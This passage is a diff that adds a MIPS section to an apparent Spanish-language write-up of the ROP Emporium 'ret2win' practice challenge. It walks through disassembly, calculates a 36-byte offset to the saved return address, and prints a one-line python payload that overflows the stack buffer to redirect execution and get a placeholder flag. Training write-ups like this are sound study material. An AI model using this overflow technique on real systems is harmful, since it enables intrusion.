@@ -404,3 +404,44 @@ io.interactive()
 # Notas
 
 En este reto calculamos el offset, pero en los siguientes retos sera el mismo para su correspondiente arquitectura.
+
+# MIPS
+
+Ya teniendo experiencia con arquitecturas anteriores, me bastó un vistazo a [esta tabla de referencia de la arquitectura](https://www.kth.se/social/files/563c63c9f276547044e8695f/mips-ref-sheet.pdf) para comprender lo básico. En resumen:
+- El equivalente a un "call" en esta arquitectura es un "jump and link", `jal label` y "jump and link register", `jalr rs`, ambos hacen `$ra := PC + 4; PC := reg(rs);`
+- El prologo de una funcion comienza almacenando el registro ra en el stack, `sw ra, address` y el epilogo termina recuperandolo, `lw ra, address`.
+
+```
+# pwnme
+|           0x004009a4      38000624       addiu a2, zero, 0x38        ; arg3
+|           0x004009a8      1800c227       addiu v0, fp, 0x18
+|           0x004009ac      25284000       move a1, v0
+|           0x004009b0      25200000       move a0, zero
+|           0x004009b4      6480828f       lw v0, -sym._MIPS_STUBS_(gp) ; [0x400b80:4]=0x8f998010 ; sym.imp.read
+...
+|           0x004009ec      3c00bf8f       lw ra, (var_3ch)
+|           0x004009f0      3800be8f       lw fp, (var_38h)
+|           0x004009f4      4000bd27       addiu sp, sp, 0x40
+|           0x004009f8      0800e003       jr ra
+```
+
+La entrada de usuario se almacena en `fp - 0x18` (fp es frame pointer, equivalente a `ebp` en x86 y registro homónimo en arm32), y la dirección de retorno se ecuentra en `fp - 0x3c` , entonces se encuentra a un offset de 0x3c-0x18=36 bytes. 
+
+```
+└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*36 + b'\x00\x0a\x40\x00')" |  qemu-mipsel -L /usr/mipsel-linux-gnu ret2win_mipsel
+ret2win by ROP Emporium
+MIPS
+
+For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
+What could possibly go wrong?
+You there, may I have your input please? And don't worry about null bytes, we're using read()!
+
+> Thank you!
+Well done! Here's your flag:
+ROPE{a_placeholder_32byte_flag!}
+```
+
+Nota: Curiosamente se queda en un loop y no causa Segmentation Fault.
+
+
+
